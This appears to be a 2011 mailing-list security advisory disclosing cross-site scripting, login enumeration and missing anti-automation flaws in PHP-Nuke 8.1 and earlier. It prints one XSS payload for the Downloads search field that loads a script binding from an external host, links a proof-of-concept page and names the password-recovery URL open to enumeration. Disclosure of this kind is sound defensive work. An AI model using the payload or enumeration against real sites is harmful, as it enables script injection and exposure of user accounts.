Subject: XSS, AoF and IAA vulnerabilities in PHP-Nuke

Hello list!

I want to warn you about Cross-Site Scripting, Abuse of Functionality and
Insufficient Anti-automation vulnerabilities in PHP-Nuke.

-------------------------
Affected products:
-------------------------

Vulnerable are PHP-Nuke 8.1 and previous versions.

Taking into account that developers of PHP-Nuke (as old, as new ones) for
many years ignore to fix multiple vulnerabilities as in their system, as at
their official site, then users of PHP-Nuke need to do one of the following.
To fix holes by themselves, or to use version of PHP-Nuke from external
communities (like Rus-PHPNuke, which are trying to fix holes in CMS,
including all holes which I disclosed) or to use another CMS.

----------
Details:
----------

XSS (WASC-08):

POST request at page http://site/modules.php?name=Downloads

" style="-moz-binding:url('http://websecurity.com.ua/webtools/xss.xml#xss')
In search field.

This is version for Mozilla and Firefox (before 3.0). Example of exploit:

http://websecurity.com.ua/uploads/2011/PHP-Nuke%20XSS.html

Abuse of Functionality (WASC-42):

http://site/modules.php?name=Your_Account&op=pass_lost

In this functionality it's possible to enumerate logins.

Insufficient Anti-automation (WASC-21):

This functionality have no protection from automated attacks. Which allows
to automate login enumeration to reveal logins of users in the system (and
also for sending of letters to users of the site).

------------
Timeline:
------------

2011.03.16 - announced at my site.
2011.03.17 - informed developers.
2011.04.15 - disclosed at my site.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/5009/).

Best wishes & regards,
